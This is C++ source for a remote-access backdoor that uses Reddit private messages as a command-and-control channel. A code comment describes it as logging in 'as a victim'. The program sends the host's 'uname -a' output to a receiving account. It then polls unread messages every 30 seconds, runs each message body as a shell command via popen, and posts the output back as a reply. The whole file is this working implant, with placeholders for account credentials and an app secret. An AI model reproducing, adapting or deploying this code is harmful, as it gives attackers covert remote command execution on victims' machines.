//g++ -pthread -lcurl -o "reddit" "reddit.cxx"
#include <curl/curl.h>
#include <pstreams/pstream.h>		//redi (libpstreams-dev)
#include <regex>
#include <thread>
//#include <iostream>				//cout
//#include <ctime>
//#include <chrono>					//why aren't these libraries needed? I'm using functions from them
//#include <string>
using namespace std;

namespace
{
		size_t callback(
		const char* in,
		std::size_t size,
		std::size_t num,
		std::string* out)
	{
		const size_t totalBytes(size * num);
		out->clear();
		out->append(in, totalBytes);
		return totalBytes;
	}
}

string shell_exec(string cmdstr)
{
	//cout << cmdstr << endl;
	const char* cmd = cmdstr.c_str();
	array<char, 10240> buffer;			// I've no idea what I'm doing with the buffer size. originally 128, but I figured it may need to be large enough to accomodate file transfers of 10,000bytes
	string results;
	unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		results += buffer.data();
	}
	//cout << results << endl;
	return results;
}

string curl(string method, string access_token, string data, string curl_api)
{
	string results = "", url = "https://oauth.reddit.com" + curl_api;
	string auth = "Authorization: bearer " + access_token;
	CURL *curlHandle = curl_easy_init();
	unique_ptr<string> response(new string());
	curl_easy_setopt(curlHandle, CURLOPT_CUSTOMREQUEST, method.c_str());
	curl_easy_setopt(curlHandle, CURLOPT_URL, url.c_str());
	curl_easy_setopt(curlHandle, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36");
	struct curl_slist *headers = NULL;
	headers = curl_slist_append(headers, auth.c_str());
	curl_easy_setopt(curlHandle, CURLOPT_HTTPHEADER, headers);
	if (method == "POST") {
		curl_easy_setopt(curlHandle, CURLOPT_POSTFIELDS, data.c_str());
	}
	curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, callback);
	curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, response.get());
	curl_easy_perform(curlHandle);
	curl_easy_cleanup(curlHandle);
	results = *response;
	return results;
}

string login(string username, string password, string id, string secret)
{
	string grant_type = "grant_type=password&username=" + username + "&password=" + password;
	string userpwd = id + ":" + secret;
	CURL *curlHandle = curl_easy_init();
	unique_ptr<string> response(new string());
	curl_easy_setopt(curlHandle, CURLOPT_POST, 1L);
	curl_easy_setopt(curlHandle, CURLOPT_URL, "https://www.reddit.com/api/v1/access_token");
	curl_easy_setopt(curlHandle, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36");
	curl_easy_setopt(curlHandle, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_easy_setopt(curlHandle, CURLOPT_USERPWD, userpwd.c_str());
	curl_easy_setopt(curlHandle, CURLOPT_POSTFIELDS, grant_type.c_str());
	curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, callback);
	curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, response.get());
	//do {													// wreckless while loop. This is probably breaking something.
		CURLcode curlResponse = curl_easy_perform(curlHandle);
	/*	if (curlResponse == CURLE_OK) {						// if 'A' request was successful. This only matters if there are connection or DNS issues.
			break;
		} else {
			this_thread::sleep_for(chrono::seconds(10));	// sleep before attempting to connect again
		}
	}
	while(true);*/
	curl_easy_cleanup(curlHandle);
	string get_access_token = *response;
    regex access_token_regex(R"|("access_token": "([^"]*)")|");
    smatch search_match;
	regex_search(get_access_token, search_match, access_token_regex);
	string access_token =  search_match[1];
	return access_token;
}

void compose(string access_token, string to, string subject, string body)
{
	string data = "to=" + to + "&subject=" + subject + "&text=" + body;
	curl("POST", access_token, data, "/api/compose");
}

string get_contents(string access_token, string thing_id)
{
	string contents;
	string get_body = curl("GET", access_token, "", "/message/unread");
	regex body_regex(R"|("body": "([\s\S]+)", "dest":)|");
	regex amp("&amp;"), quote("\\\\\""), less("&lt;"), greater("&gt;"), escape("\\\\\\\\");
	smatch search_match;
	regex_search(get_body, search_match, body_regex);
	contents = search_match[1];
	if (contents.find("&amp;") != string::npos){
		contents = regex_replace (contents, amp, "&");
	} if (contents.find("\\\"") != string::npos){
		contents = regex_replace (contents, quote, "\"");
	} if (contents.find("&lt;") != string::npos){
		contents = regex_replace (contents, less, "<");
	} if (contents.find("&gt;") != string::npos){
		contents = regex_replace (contents, greater, ">");
	} if (contents.find("\\\\") != string::npos){
		contents = regex_replace (contents, escape, "\\");
	}
	return contents;
}


void reply(string access_token, string thing_id, string body)
{
	string data = "thing_id=" + thing_id + "&text=" + body;
	curl("POST", access_token, data, "/api/comment");
}


string check_new_message(string access_token)
{
	string message, thing_id;
	smatch search_match;
	string get_message = curl("GET", access_token, "", "/message/unread");
	regex message_regex(R"|("dist": (\d))|");
	regex_search(get_message, search_match, message_regex);
	message = search_match[1];
	if (message == "1"){
		regex thing_id_regex(R"|("name": "([^"]*)")|");
		regex_search(get_message, search_match, thing_id_regex);
		string thing_id =  search_match[1];
		return thing_id;
	}else if (message == ""){
		return "get_new_token";
	}else{
		return message;
	}
}

 int main()
{
	curl_global_init(long CURL_GLOBAL_SSL);
	string username = "<username>", password = "<password>", to = "<username>";	// edit to your needs. Logs in as a victim, sent to a receiver.
	string id = "<id>", secret = "<secret>";									// requires you to create an app <https://www.reddit.com/prefs/apps>
	string epoch = to_string(time(nullptr));
	string access_token = login(username, password, id, secret);
	curl("POST", access_token, "", "/api/read_all_messages");
	compose(access_token, to, epoch, shell_exec("uname -a"));
	string thing_id, backup_id;
	do {
		thing_id = check_new_message(access_token);
		if (thing_id == "0"){
		}else if (thing_id.rfind("t4_", 0) == 0){
			reply(access_token, thing_id, shell_exec(get_contents(access_token, thing_id)));
			curl("POST", access_token, "", "/api/read_all_messages");
			backup_id = thing_id;
		}else if (thing_id == "get_new_token"){
				access_token = login(username, password, id, secret);
		}else{
			reply(access_token, backup_id, "error: " + thing_id + " commands received: clearing queue");
			curl("POST", access_token, "", "/api/read_all_messages");
		}
		this_thread::sleep_for(chrono::seconds(30));
	}
	while(true);
	return 0;
}
